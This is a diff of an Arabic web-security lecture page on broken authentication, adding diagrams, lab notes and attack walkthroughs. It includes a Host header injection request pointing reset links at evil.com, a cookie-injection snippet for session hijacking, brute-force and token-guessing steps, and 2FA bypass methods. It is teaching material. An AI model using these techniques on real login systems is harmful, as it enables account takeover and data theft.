@@ -40,7 +40,30 @@
         .lab-card p { color: #dbeafe; font-size: 0.95rem; }
         .lab-link { display: inline-block; background: #3b82f6; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; margin-top: 10px; font-size: 0.9rem; }
         .lab-link:hover { background: #2563eb; }
-        .mermaid { background: #ffffff; border-radius: 8px; padding: 16px; margin: 16px 0; }
+        .mermaid { 
+            background: #1a2332 !important; 
+            border: 1px solid #2d3748; 
+            border-radius: 8px; 
+            padding: 16px; 
+            margin: 16px 0; 
+            color: #e8eaed !important;
+        }
+        
+        /* تأكيد أن جميع عناصر Mermaid تستخدم الألوان الداكنة */
+        .mermaid svg {
+            background: #1a2332 !important;
+        }
+        
+        .mermaid .node rect, .mermaid .node circle, .mermaid .node ellipse, .mermaid .node polygon {
+            fill: #1a2332 !important;
+            stroke: #2d3748 !important;
+            color: #e8eaed !important;
+        }
+        
+        .mermaid .edgeLabel {
+            background-color: #1a2332 !important;
+            color: #e8eaed !important;
+        }
     </style>
 </head>
 <body>
@@ -50,7 +73,7 @@
             <div class="subtitle">مصادقة ضعيفة، إدارة جلسات غير آمنة، وأخطاء تكامل OAuth</div>
             <div class="lecture-info">
                 <div class="info-item"><i class="fas fa-clock"></i> ساعتان</div>
-                <div class="info-item"><i class="fas fa-flask"></i> 10 مختبرات</div>
+                <div class="info-item"><i class="fas fa-flask"></i> 15 مختبر</div>
                 <div class="info-item"><i class="fas fa-signal"></i> متوسط إلى متقدم</div>
                 <div class="info-item"><i class="fas fa-shield-alt"></i> حماية شاملة</div>
             </div>
@@ -74,19 +97,206 @@
         </div>
 
         <section id="intro">
-            <h2><i class="fas fa-info-circle"></i> مقدمة</h2>
-            <p>تهدف هذه المحاضرة إلى كشف أخطاء المصادقة الأكثر شيوعاً مثل كلمات المرور الضعيفة، إدارة الجلسات غير الآمنة، وتجاوز المصادقة، بالإضافة إلى أخطاء تكامل OAuth 2.0 مثل سوء إعداد redirect_uri، إساءة استخدام authorization code، وثغرات PKCE.</p>
+            <h2><i class="fas fa-info-circle"></i> مقدمة - ما هو Broken Authentication؟</h2>
+            
+            <p>مرحباً بكم في المحاضرة الخامسة من سلسلة أمان تطبيقات الويب! 🎯</p>
+            
+            <p>تخيل أن منزلك له قفل إلكتروني، ولكن هذا القفل به عيوب: أحياناً يفتح بكلمة مرور خاطئة، وأحياناً ينسى أن يتحقق من هويتك، وأحياناً يمكن خداعه بسهولة. هذا بالضبط ما يحدث في <strong>ثغرات Broken Authentication</strong>!</p>
+
+            <p><strong>Broken Authentication</strong> هي واحدة من أخطر الثغرات في تطبيقات الويب حسب OWASP Top 10. تحدث عندما يفشل التطبيق في التحقق من هوية المستخدمين بشكل صحيح، مما يسمح للمهاجمين بالوصول غير المشروع للحسابات.</p>
+            
+            <div class="tip">
+                <h4><i class="fas fa-lightbulb"></i> ما ستتعلمه في هذه المحاضرة</h4>
+                <ul class="list">
+                    <li>🎯 فهم مفهوم المصادقة المكسورة من الصفر بأمثلة عملية</li>
+                    <li>🖼️ رسوم توضيحية تشرح كيف تعمل الثغرات بصرياً</li>
+                    <li>🔐 شرح مفصل لـ JWT وأنواع التشفير (JWS vs JWE)</li>
+                    <li>🔓 OAuth 2.0 وثغراته الشائعة مع أمثلة حقيقية</li>
+                    <li>⚔️ 8 أنواع مختلفة من هجمات المصادقة</li>
+                    <li>🧪 15 مختبر عملي متدرج الصعوبة من PortSwigger</li>
+                    <li>🛡️ طرق الحماية الشاملة والدفاع</li>
+                    <li>🔧 أدوات الاختبار والاكتشاف المتقدمة</li>
+                </ul>
+            </div>
+
+            <div class="mermaid">
+graph TD
+    A[المستخدم يحاول تسجيل الدخول] --> B{التطبيق الآمن؟}
+    B -->|✅ آمن| C[يتحقق من كلمة المرور]
+    B -->|❌ غير آمن| D[يقبل كلمة مرور ضعيفة]
+    
+    C --> E{كلمة المرور صحيحة؟}
+    E -->|نعم| F[ينشئ جلسة آمنة]
+    E -->|لا| G[يرفض الدخول]
+    
+    D --> H[ينشئ جلسة غير آمنة]
+    F --> I[المستخدم يدخل بأمان]
+    H --> J[❌ المهاجم يمكنه اختطاف الجلسة]
+    G --> K[المستخدم محمي]
+    
+    style D fill:#ffebee
+    style H fill:#ffebee  
+    style J fill:#ffebee
+    style F fill:#e8f5e8
+    style I fill:#e8f5e8
+    style K fill:#e8f5e8
+            </div>
+
+            <div class="danger">
+                <h4><i class="fas fa-exclamation-triangle"></i> لماذا Broken Authentication خطيرة جداً؟</h4>
+                <p>تخيل أن شخص غريب يستطيع فتح باب منزلك، والدخول لحسابك البنكي، وقراءة رسائلك الخاصة، والتسوق باسمك! هذا بالضبط ما يحدث عندما تكون المصادقة مكسورة:</p>
+                <ul class="list">
+                    <li><strong>💰 خسائر مالية:</strong> سرقة الأموال من الحسابات البنكية</li>
+                    <li><strong>🔐 اختراق الحسابات:</strong> الوصول لحسابات التواصل الاجتماعي والبريد الإلكتروني</li>
+                    <li><strong>📱 سرقة الهوية:</strong> انتحال شخصية المستخدمين</li>
+                    <li><strong>📊 تسريب البيانات:</strong> كشف معلومات شخصية حساسة</li>
+                    <li><strong>🏢 ضرر السمعة:</strong> فقدان ثقة العملاء في الشركة</li>
+                </ul>
+            </div>
+
+            <div class="warn">
+                <h4>📋 ملاحظات مهمة للمختبرات</h4>
+                <ul class="list">
+                    <li><strong>PortSwigger Labs:</strong> جميع المختبرات تتطلب حساب مجاني على PortSwigger Academy</li>
+                    <li><strong>Exploit Server:</strong> في المختبرات، "YOUR-EXPLOIT-SERVER" يشير للخادم المقدم من PortSwigger</li>
+                    <li><strong>Burp Suite:</strong> استخدم Burp Suite Community (مجاني) أو Professional لحل المختبرات</li>
+                    <li><strong>التعلم الآمن:</strong> جميع المختبرات في بيئة آمنة ومعزولة</li>
+                </ul>
+            </div>
+
+            <div class="danger">
+                <h4><i class="fas fa-exclamation-triangle"></i> تحذير مهم</h4>
+                <p><strong>هذه المحاضرة لأغراض تعليمية فقط!</strong> 📚</p>
+                <p>لا تستخدم هذه التقنيات على أنظمة لا تملك إذناً قانونياً لاختبارها. الاستخدام غير المشروع لهذه التقنيات قد يعرضك للمساءلة القانونية. استخدم المختبرات المخصصة للتعلم فقط.</p>
+            </div>
+        </section>
+
+        <section id="auth-concept">
+            <h2><i class="fas fa-lightbulb"></i> فهم المفهوم بالرسوم التوضيحية</h2>
+            
+            <h3><i class="fas fa-eye"></i> مثال بصري بسيط - مطعم مع نادل</h3>
+            
+            <div class="attack-demo">
+                <h4>🍽️ مثال المطعم - سيناريو المصادقة</h4>
+                <div class="mermaid">
+graph TD
+    subgraph "مطعم آمن ✅"
+        A1[زبون جديد يدخل المطعم] --> B1[النادل: ما اسمك؟]
+        B1 --> C1[الزبون: أحمد محمد]
+        C1 --> D1[النادل: هل لديك حجز؟]
+        D1 --> E1[الزبون: نعم، رقم الحجز 1234]
+        E1 --> F1[النادل يتحقق من قائمة الحجوزات]
+        F1 --> G1[✅ الحجز موجود]
+        G1 --> H1[النادل: تفضل طاولتك رقم 5]
+    end
+    
+    subgraph "مطعم غير آمن ❌"
+        A2[مهاجم يدخل المطعم] --> B2[النادل: ما اسمك؟]
+        B2 --> C2[المهاجم: أحمد محمد]
+        C2 --> D2[❌ النادل لا يطلب إثبات هوية]
+        D2 --> E2[النادل: تفضل أي طاولة تريد]
+        E2 --> F2[❌ المهاجم يجلس في طاولة شخص آخر]
+        F2 --> G2[❌ يأكل طعام الآخرين مجاناً]
+    end
+    
+    style A2 fill:#ffebee
+    style D2 fill:#ffebee
+    style E2 fill:#ffebee
+    style F2 fill:#ffebee
+    style G2 fill:#ffebee
+                </div>
+                
+                <p><strong>في عالم التطبيقات:</strong> النادل = التطبيق، الحجز = كلمة المرور، الطاولة = الحساب الشخصي</p>
+            </div>
+
+            <div class="attack-demo">
+                <h4>📊 مقارنة: التطبيق الآمن vs غير الآمن</h4>
+                <div class="mermaid">
+graph LR
+    subgraph "تطبيق آمن ✅"
+        A1[المستخدم يدخل<br/>username + password] --> B1[التطبيق يتحقق<br/>من قاعدة البيانات]
+        B1 --> C1{كلمة المرور<br/>صحيحة؟}
+        C1 -->|نعم| D1[ينشئ session آمنة<br/>مع انتهاء صلاحية]
+        C1 -->|لا| E1[يرفض الدخول<br/>ويسجل المحاولة]
+        D1 --> F1[يدخل المستخدم<br/>بأمان]
+    end
+    
+    subgraph "تطبيق غير آمن ❌"
+        A2[المستخدم يدخل<br/>username + password] --> B2[❌ التطبيق لا يتحقق<br/>أو يتحقق بشكل ضعيف]
+        B2 --> C2[❌ يقبل كلمات مرور<br/>ضعيفة أو فارغة]
+        C2 --> D2[❌ ينشئ session غير آمنة<br/>بدون انتهاء صلاحية]
+        D2 --> E2[❌ يمكن للمهاجم<br/>اختطاف الجلسة]
+    end
+    
+    style A2 fill:#ffebee
+    style B2 fill:#ffebee
+    style C2 fill:#ffebee
+    style D2 fill:#ffebee
+    style E2 fill:#ffebee
+                </div>
+            </div>
+
+            <div class="tip">
+                <h4><i class="fas fa-brain"></i> نصائح لفهم Broken Authentication بسهولة</h4>
+                <ul class="list">
+                    <li><strong>🔑 القاعدة الذهبية:</strong> أي تطبيق لا يتحقق جيداً من هويتك = خطر</li>
+                    <li><strong>🎯 ابحث عن:</strong> صفحات تسجيل الدخول، reset password، تغيير كلمة المرور</li>
+                    <li><strong>🧪 اختبر دائماً:</strong> كلمات مرور ضعيفة، جلسات منتهية الصلاحية</li>
+                    <li><strong>⚠️ علامات الخطر:</strong> إذا دخلت بكلمة مرور خاطئة = ثغرة موجودة</li>
+                </ul>
+            </div>
         </section>
 
         <section id="auth-basics">
             <h2><i class="fas fa-key"></i> أساسيات المصادقة وإدارة الجلسات</h2>
+            
+            <h3><i class="fas fa-question-circle"></i> ما الفرق بين Authentication و Authorization؟</h3>
+            
+            <div class="mermaid">
+graph TD
+    A[مستخدم يريد الدخول] --> B[Authentication: من أنت؟]
+    B --> C[يدخل username + password]
+    C --> D{هل البيانات صحيحة؟}
+    D -->|نعم| E[✅ تم التحقق من الهوية]
+    D -->|لا| F[❌ رفض الدخول]
+    
+    E --> G[Authorization: ماذا يحق لك أن تفعل؟]
+    G --> H[التحقق من الصلاحيات]
+    H --> I[عرض المحتوى المسموح فقط]
+    
+    style E fill:#e8f5e8
+    style F fill:#ffebee
+    style I fill:#e8f5e8
+            </div>
+
             <div class="grid">
                 <div class="card">
-                    <h3>المصادقة مقابل التفويض</h3>
+                    <h3>🔐 Authentication (المصادقة)</h3>
                     <ul class="list">
-                        <li>Authentication: من أنت؟</li>
-                        <li>Authorization: ماذا يسمح لك أن تفعل؟</li>
-                        <li>OAuth هو إطار للتفويض وليس للمصادقة.</li>
+                        <li><strong>السؤال:</strong> من أنت؟</li>
+                        <li><strong>الهدف:</strong> التحقق من هوية المستخدم</li>
+                        <li><strong>الطرق:</strong> username/password، بصمة، رمز SMS</li>
+                        <li><strong>المثال:</strong> إدخال كلمة المرور لفتح الهاتف</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <h3>🔑 Authorization (التفويض)</h3>
+                    <ul class="list">
+                        <li><strong>السؤال:</strong> ماذا يحق لك أن تفعل؟</li>
+                        <li><strong>الهدف:</strong> تحديد الصلاحيات والأذونات</li>
+                        <li><strong>الطرق:</strong> Roles، Permissions، ACLs</li>
+                        <li><strong>المثال:</strong> هل يمكنك حذف هذا الملف؟</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <h3>🔄 Session Management (إدارة الجلسات)</h3>
+                    <ul class="list">
+                        <li><strong>الهدف:</strong> تتبع المستخدم بعد تسجيل الدخول</li>
+                        <li><strong>الطرق:</strong> Cookies، JWT، Server Sessions</li>
+                        <li><strong>المشكلة:</strong> جلسات غير آمنة أو منتهية الصلاحية</li>
+                        <li><strong>المثال:</strong> البقاء مسجل دخول في موقع التسوق</li>
                     </ul>
                 </div>
                 <div class="card">
@@ -100,38 +310,431 @@
             </div>
         </section>
 
+        <section id="attack-scenarios">
+            <h2><i class="fas fa-crosshairs"></i> سيناريوهات الهجوم الحقيقية</h2>
+
+            <h3><i class="fas fa-shopping-cart"></i> سيناريو 1: متجر إلكتروني - كسر كلمة المرور</h3>
+            <div class="attack-demo">
+                <h4><i class="fas fa-route"></i> خطوات الهجوم</h4>
+                <p><strong>الهدف:</strong> اختراق حسابات العملاء في متجر إلكتروني</p>
+                
+                <div class="mermaid">
+graph TD
+    A[المهاجم يكتشف صفحة تسجيل الدخول] --> B[يجرب كلمات مرور شائعة]
+    B --> C{التطبيق يحمي من<br/>Brute Force؟}
+    C -->|لا ❌| D[يستخدم قائمة كلمات مرور]
+    C -->|نعم ✅| E[الهجوم يفشل]
+    
+    D --> F[password, 123456, admin]
+    F --> G[يجد حسابات بكلمات مرور ضعيفة]
+    G --> H[يدخل لحسابات العملاء]
+    H --> I[يسرق معلومات الدفع والعناوين]
+    
+    style C fill:#ffebee
+    style D fill:#ffebee
+    style F fill:#ffebee
+    style G fill:#ffebee
+    style H fill:#ffebee
+    style I fill:#ffebee
+    style E fill:#e8f5e8
+                </div>
+                
+                <div class="code-block">
+# خطوات الهجوم العملية:
+1. المهاجم يجد: https://shop.com/login
+2. يجرب حسابات شائعة:
+   - admin:admin
+   - admin:password
+   - test@shop.com:123456
+3. إذا لم يكن هناك rate limiting:
+   - يستخدم Burp Suite Intruder
+   - يحمل قائمة 1000 كلمة مرور شائعة
+   - يجرب على كل حساب عميل
+4. النتيجة: يخترق 5-10% من الحسابات!
+
+البيانات المسربة:
+- أسماء وعناوين العملاء
+- أرقام بطاقات ائتمان (آخر 4 أرقام)
+- تاريخ الطلبات والمشتريات
+- أرقام الهواتف
+                </div>
+            </div>
+
+            <h3><i class="fas fa-university"></i> سيناريو 2: نظام جامعي - Session Hijacking</h3>
+            <div class="attack-demo">
+                <h4><i class="fas fa-route"></i> خطوات الهجوم</h4>
+                <p><strong>الهدف:</strong> سرقة جلسات الطلاب للوصول لدرجاتهم وتعديلها</p>
+                
+                <div class="mermaid">
+graph TD
+    A[طالب يسجل دخول في مقهى إنترنت] --> B[يستخدم شبكة WiFi عامة]
+    B --> C[المهاجم في نفس المقهى]
+    C --> D[يستخدم Wireshark لمراقبة الشبكة]
+    D --> E{هل الموقع يستخدم HTTPS؟}
+    
+    E -->|لا ❌| F[يسرق session cookie بسهولة]
+    E -->|نعم ولكن...| G[يبحث عن Mixed Content]
+    
+    F --> H[يستخدم Cookie المسروق]
+    G --> I[يجد طلبات HTTP غير مشفرة]
+    I --> J[يسرق session من الطلبات غير الآمنة]
+    
+    H --> K[يدخل كالطالب الضحية]
+    J --> K
+    K --> L[يعدل الدرجات أو يسجل في مواد]
+    
+    style E fill:#ffebee
+    style F fill:#ffebee
+    style G fill:#ffebee
+    style I fill:#ffebee
+    style J fill:#ffebee
+    style K fill:#ffebee
+    style L fill:#ffebee
+                </div>
+                
+                <div class="code-block">
+# أدوات الهجوم:
+1. Wireshark: لمراقبة حركة المرور
+2. Burp Suite: لتحليل الطلبات
+3. Cookie Editor: لتعديل cookies في المتصفح
+
+# الكود المستخدم:
+document.cookie = "JSESSIONID=ABC123XYZ789; domain=.university.edu";
+location.reload(); // إعادة تحميل الصفحة بالـ session الجديد
+
+# النتيجة:
+- الوصول لحساب الطالب الضحية
+- رؤية الدرجات والجدول الدراسي
+- إمكانية التسجيل في مواد أو إلغاء التسجيل
+- الوصول لمعلومات شخصية حساسة
+                </div>
+            </div>
+
+            <h3><i class="fas fa-hospital"></i> سيناريو 3: نظام طبي - Password Reset Vulnerability</h3>
+            <div class="attack-demo">
+                <h4><i class="fas fa-route"></i> خطوات الهجوم</h4>
+                <p><strong>الهدف:</strong> الوصول لسجلات المرضى الطبية</p>
+                
+                <div class="mermaid">
+graph TD
+    A[المهاجم يجد صفحة Password Reset] --> B[يدخل email الضحية]
+    B --> C[النظام يرسل رابط reset]
+    C --> D[المهاجم يحلل رابط Reset]
+    D --> E{هل الرابط قابل للتنبؤ؟}
+    
+    E -->|نعم ❌| F[reset.php?token=123456]
+    E -->|لا ولكن...| G[يبحث عن طرق أخرى]
+    
+    F --> H[يجرب أرقام متسلسلة]
+    G --> I[يجرب Password Reset Poisoning]
+    
+    H --> J[يجد tokens صالحة]
+    I --> K[يغير Host header ليوجه email له]
+    
+    J --> L[يغير كلمة مرور الضحية]
+    K --> M[يحصل على reset token]
+    M --> L
+    
+    L --> N[يدخل لحساب الطبيب/المريض]
+    N --> O[يصل للسجلات الطبية الحساسة]
+    
+    style E fill:#ffebee
+    style F fill:#ffebee
+    style H fill:#ffebee
+    style I fill:#ffebee
+    style J fill:#ffebee
+    style K fill:#ffebee
+    style L fill:#ffebee
+    style N fill:#ffebee
+    style O fill:#ffebee
+                </div>
+                
+                <div class="code-block">
+# مثال Token ضعيف:
+https://hospital.com/reset?token=1001
+https://hospital.com/reset?token=1002  ← المهاجم يجرب
+https://hospital.com/reset?token=1003
+
+# Host Header Injection:
+POST /forgot-password HTTP/1.1
+Host: evil.com  ← تغيير الـ Host
+Content-Type: application/x-www-form-urlencoded
+
+email=doctor@hospital.com
+
+# النتيجة:
+Email يُرسل إلى doctor@hospital.com لكن الرابط يشير إلى:
+https://evil.com/reset?token=ABC123
+
+# البيانات المعرضة للخطر:
+- سجلات طبية للمرضى
+- تشخيصات ووصفات طبية
+- معلومات التأمين الصحي
+- بيانات شخصية حساسة (أمراض، عمليات)
+                </div>
+            </div>
+
+            <div class="danger">
+                <h4><i class="fas fa-exclamation-triangle"></i> تأثير Broken Authentication على القطاعات الحساسة</h4>
+                <ul class="list">
+                    <li><strong>🏥 القطاع الطبي:</strong> تسريب سجلات المرضى وانتهاك خصوصيتهم</li>
+                    <li><strong>🏦 القطاع المصرفي:</strong> سرقة أموال وبيانات مالية حساسة</li>
+                    <li><strong>🎓 القطاع التعليمي:</strong> تعديل درجات وسرقة هويات أكاديمية</li>
+                    <li><strong>🏢 الشركات:</strong> تسريب أسرار تجارية ومعلومات موظفين</li>
+                    <li><strong>🛒 التجارة الإلكترونية:</strong> سرقة بيانات عملاء ومعلومات دفع</li>
+                </ul>
+            </div>
+        </section>
+
         <section id="broken-auth-types">
-            <h2><i class="fas fa-lock-open"></i> أنواع Broken Authentication</h2>
-            <div class="grid">
-                <div class="card">
-                    <h3>تخمين/إعادة استخدام كلمات المرور</h3>
-                    <ul class="list">
-                        <li>Credential Stuffing, Brute Force, Password Spraying</li>
-                        <li>2FA Bypass بسوء التنفيذ</li>
-                    </ul>
+            <h2><i class="fas fa-lock-open"></i> أنواع Broken Authentication الثمانية</h2>
+            
+            <p>هناك 8 أنواع رئيسية من ثغرات المصادقة المكسورة، كل نوع له أساليب استغلال مختلفة ومستويات خطورة متفاوتة:</p>
+
+            <div class="attack-demo">
+                <h4>🔓 1. Credential Attacks - هجمات كلمات المرور</h4>
+                <p>الأكثر شيوعاً وخطورة - يشمل جميع الهجمات على كلمات المرور</p>
+                
+                <div class="grid">
+                    <div class="card">
+                        <h4>🔨 Brute Force</h4>
+                        <ul class="list">
+                            <li><strong>الطريقة:</strong> تجريب جميع التركيبات الممكنة</li>
+                            <li><strong>المثال:</strong> 0000, 0001, 0002... 9999</li>
+                            <li><strong>الهدف:</strong> كلمات مرور قصيرة أو رقمية</li>
+                            <li><strong>الوقت:</strong> ساعات إلى أيام</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>📚 Dictionary Attack</h4>
+                        <ul class="list">
+                            <li><strong>الطريقة:</strong> استخدام قوائم كلمات مرور شائعة</li>
+                            <li><strong>المثال:</strong> password, 123456, admin</li>
+                            <li><strong>الهدف:</strong> كلمات مرور ضعيفة</li>
+                            <li><strong>الوقت:</strong> دقائق إلى ساعات</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>🔄 Credential Stuffing</h4>
+                        <ul class="list">
+                            <li><strong>الطريقة:</strong> استخدام كلمات مرور مسربة</li>
+                            <li><strong>المصدر:</strong> تسريبات قواعد بيانات سابقة</li>
+                            <li><strong>الهدف:</strong> مستخدمين يعيدون استخدام كلمات المرور</li>
+                            <li><strong>النجاح:</strong> 0.1-2% من المحاولات</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>💧 Password Spraying</h4>
+                        <ul class="list">
+                            <li><strong>الطريقة:</strong> كلمة مرور واحدة على حسابات كثيرة</li>
+                            <li><strong>المثال:</strong> تجريب "Password123" على 1000 حساب</li>
+                            <li><strong>الميزة:</strong> يتجنب account lockout</li>
+                            <li><strong>الهدف:</strong> شركات بسياسات كلمات مرور ضعيفة</li>
+                        </ul>
+                    </div>
                 </div>
-                <div class="card">
-                    <h3>مشاكل إدارة الجلسة</h3>
-                    <ul class="list">
-                        <li>Session Fixation, Predictable Session IDs</li>
-                        <li>عدم تدوير الجلسة بعد تسجيل الدخول</li>
-                    </ul>
+            </div>
+
+            <div class="attack-demo">
+                <h4>🍪 2. Session Management Issues - مشاكل إدارة الجلسات</h4>
+                <p>ثاني أخطر الثغرات - استغلال ضعف في إدارة جلسات المستخدمين</p>
+                
+                <div class="mermaid">
+graph TD
+    A[المستخدم يسجل دخول] --> B[التطبيق ينشئ Session]
+    B --> C{هل Session آمن؟}
+    C -->|لا ❌| D[Session ID قابل للتنبؤ<br/>مثل: USER123_20250108]
+    C -->|نعم ✅| E[Session ID عشوائي<br/>مثل: a7b2f4d8e9c1...]
+    
+    D --> F[المهاجم يخمن Session IDs أخرى]
+    F --> G[يدخل كمستخدمين آخرين]
+    
+    E --> H[لا يمكن تخمين Session]
+    H --> I[الجلسة آمنة]
+    
+    style C fill:#ffebee
+    style D fill:#ffebee
+    style F fill:#ffebee
+    style G fill:#ffebee
+    style E fill:#e8f5e8
+    style H fill:#e8f5e8
+    style I fill:#e8f5e8
                 </div>
-                <div class="card">
-                    <h3>مشاكل استرداد كلمة المرور</h3>
-                    <ul class="list">
-                        <li>Tokens غير منتهية أو قابلة للتخمين</li>
-                        <li>عدم التحقق من الملكية قبل التغيير</li>
-                    </ul>
+                
+                <div class="grid">
+                    <div class="card">
+                        <h4>🔮 Predictable Session IDs</h4>
+                        <p>Session IDs قابلة للتنبؤ أو تحتوي معلومات يمكن تخمينها</p>
+                        <div class="code-block">
+❌ أمثلة ضعيفة:
+SESSIONID=USER123_20250108_001
+JSESSIONID=12345
+SESSION=admin_session_1
+
+✅ أمثلة آمنة:
+SESSIONID=a7b2f4d8e9c1a3b5f7d9e2c4a6b8d0f2
+JSESSIONID=9f8e7d6c5b4a39281f7e6d5c4b3a2918
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>🔒 Session Fixation</h4>
+                        <p>المهاجم يحدد Session ID ويخدع الضحية لاستخدامه</p>
+                        <div class="code-block">
+# خطوات الهجوم:
+1. المهاجم يحصل على session: ABC123
+2. يرسل رابط للضحية: 
+   site.com/login?JSESSIONID=ABC123
+3. الضحية تسجل دخول بنفس Session
+4. المهاجم يستخدم ABC123 ويدخل كالضحية
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>♻️ Session Not Rotated</h4>
+                        <p>عدم تغيير Session ID بعد تسجيل الدخول أو تغيير الصلاحيات</p>
+                        <div class="code-block">
+❌ المشكلة:
+1. المستخدم يزور الموقع: SESSION=ABC123
+2. يسجل دخول: لا يزال SESSION=ABC123
+3. إذا سُرق ABC123 قبل الدخول، المهاجم يدخل
+
+✅ الحل:
+1. المستخدم يزور الموقع: SESSION=ABC123
+2. يسجل دخول: SESSION=XYZ789 (جديد)
+3. Session القديم لا يعمل بعد الآن
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>⏰ Session Timeout Issues</h4>
+                        <p>جلسات لا تنتهي أو تنتهي بعد وقت طويل جداً</p>
+                        <div class="code-block">
+❌ مشاكل شائعة:
+- Session لا ينتهي أبداً
+- Session ينتهي بعد أسابيع
+- عدم انتهاء Session عند إغلاق المتصفح
+- عدم إنهاء Session عند Logout
+
+✅ الممارسة الآمنة:
+- انتهاء تلقائي خلال 30 دقيقة من عدم النشاط
+- انتهاء فوري عند Logout
+- انتهاء عند إغلاق المتصفح (للمواقع الحساسة)
+                        </div>
+                    </div>
                 </div>
-                <div class="card">
-                    <h3>ثغرات JWT</h3>
-                    <ul class="list">
-                        <li>None Algorithm, Key Confusion</li>
-                        <li>تخزين مفاتيح سرية على العميل</li>
-                        <li>JWE Misuse (تشفير بدون مصادقة)</li>
-                    </ul>
+            </div>
+
+            <div class="attack-demo">
+                <h4>🔄 3. Password Reset Vulnerabilities - ثغرات استرداد كلمة المرور</h4>
+                <p>استغلال ضعف في آلية إعادة تعيين كلمة المرور</p>
+                
+                <div class="grid">
+                    <div class="card">
+                        <h4>🎯 Weak Reset Tokens</h4>
+                        <div class="code-block">
+❌ Tokens ضعيفة:
+reset.php?token=12345
+reset.php?token=user123_20250108
+reset.php?token=md5(email)
+
+# كيف يستغل المهاجم:
+1. يطلب reset لحسابه: token=12345
+2. يجرب tokens أخرى: 12346, 12347...
+3. يجد token صالح لمستخدم آخر
+4. يغير كلمة مرور الضحية
+
+✅ Tokens آمنة:
+reset.php?token=a7b2f4d8e9c1a3b5f7d9e2c4a6b8d0f2
+- 32+ حرف عشوائي
+- تنتهي خلال 15 دقيقة
+- تُستخدم مرة واحدة فقط
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>🌐 Host Header Injection</h4>
+                        <div class="code-block">
+# الهجوم:
+POST /forgot-password HTTP/1.1
+Host: evil.com  ← تغيير Host header
+Content-Type: application/x-www-form-urlencoded
+
+email=victim@company.com
+
+# النتيجة:
+Email يُرسل لـ victim@company.com لكن الرابط:
+https://evil.com/reset?token=ABC123
+
+# عندما تضغط الضحية الرابط:
+- تذهب لموقع المهاجم
+- المهاجم يحصل على reset token
+- يستخدمه لتغيير كلمة مرور الضحية
+                        </div>
+                    </div>
                 </div>
+            </div>
+
+            <div class="attack-demo">
+                <h4>🔐 4. Multi-Factor Authentication (2FA) Bypass</h4>
+                <p>تجاوز المصادقة الثنائية بسبب تطبيق خاطئ</p>
+                
+                <div class="mermaid">
+graph TD
+    A[المستخدم يدخل username/password] --> B[✅ كلمة المرور صحيحة]
+    B --> C[النظام يطلب 2FA code]
+    C --> D[المستخدم يدخل كود خاطئ]
+    D --> E{هل النظام يتحقق<br/>من 2FA بشكل صحيح؟}
+    E -->|لا ❌| F[يسمح بالدخول رغم كود خاطئ]
+    E -->|نعم ✅| G[يرفض الدخول]
+    
+    F --> H[المهاجم يتجاوز 2FA]
+    G --> I[2FA يعمل بشكل صحيح]
+    
+    style E fill:#ffebee
+    style F fill:#ffebee
+    style H fill:#ffebee
+    style G fill:#e8f5e8
+    style I fill:#e8f5e8
+                </div>
+                
+                <div class="code-block">
+# طرق تجاوز 2FA الشائعة:
+
+1. Response Manipulation:
+   - تغيير response من {"2fa_required": true} إلى false
+   - تعديل status code من 401 إلى 200
+
+2. Direct Access:
+   - الدخول مباشرة لـ /dashboard بعد كلمة المرور
+   - تجاهل خطوة 2FA
+
+3. Brute Force 2FA:
+   - تجريب جميع الأكواد من 000000 إلى 999999
+   - استغلال عدم وجود rate limiting
+
+4. Backup Code Abuse:
+   - استخدام backup codes ضعيفة
+   - تخمين backup codes قابلة للتنبؤ
+
+5. SMS Interception:
+   - SIM Swapping
+   - SS7 attacks
+   - Malware على الهاتف
+                </div>
+            </div>
+
+            <div class="tip">
+                <h4><i class="fas fa-lightbulb"></i> نصائح لاكتشاف Broken Authentication</h4>
+                <ul class="list">
+                    <li><strong>🔍 ابحث عن:</strong> صفحات login، register، forgot password، change password</li>
+                    <li><strong>🧪 اختبر:</strong> كلمات مرور ضعيفة، brute force، session hijacking</li>
+                    <li><strong>⚠️ راقب:</strong> رسائل الخطأ المختلفة، redirect behavior، cookie values</li>
+                    <li><strong>🛠️ استخدم:</strong> Burp Suite، OWASP ZAP، custom scripts</li>
+                </ul>
             </div>
         </section>
 
@@ -222,54 +825,339 @@ HMACSHA256(
                 </div>
             </div>
 
-            <h3>🔧 خوارزميات JWS الشائعة</h3>
+                        <h3>🔧 خوارزميات JWS الشائعة - شرح تفصيلي</h3>
             
-            <div class="grid">
-                <div class="card">
-                    <h4>HMAC (HS256/384/512)</h4>
-                    <p><strong>النوع:</strong> مفتاح سري مشترك (Symmetric)</p>
-                    <p><strong>الاستخدام:</strong> نفس المفتاح للتوقيع والتحقق</p>
-                    <p><strong>الأمان:</strong> سريع، لكن يتطلب مشاركة المفتاح السري</p>
-                    
-                    <div class="code-block">
-// إنشاء HMAC JWT
-const jwt = require('jsonwebtoken');
-const secret = 'my-super-secret-key';
+            <p>قبل فهم هجمات JWT، يجب أن نفهم كيف تعمل خوارزميات التشفير. هناك 3 عائلات رئيسية:</p>
 
-const token = jwt.sign({
-  sub: '123',
-  name: 'Ahmed',
-  iat: Math.floor(Date.now() / 1000)
-}, secret, { algorithm: 'HS256' });
+            <div class="attack-demo">
+                <h4>🔑 1. HMAC (Hash-based Message Authentication Code)</h4>
+                <p><strong>الفكرة:</strong> مفتاح واحد مشترك للتوقيع والتحقق</p>
+                
+                <div class="mermaid">
+graph LR
+    A[البيانات: header.payload] --> B[HMAC Function]
+    C[المفتاح السري] --> B
+    B --> D[التوقيع: hash digest]
+    
+    E[التحقق] --> F[HMAC Function]
+    G[نفس المفتاح السري] --> F
+    H[البيانات المستلمة] --> F
+    F --> I{هل التوقيع متطابق؟}
+    I -->|نعم| J[صحيح ✅]
+    I -->|لا| K[مزيف ❌]
+    
+    style C fill:#81c784
+    style G fill:#81c784
+    style J fill:#e8f5e8
+    style K fill:#ffebee
+                </div>
+                
+                <div class="code-block">
+# كيف يعمل HMAC داخلياً:
+
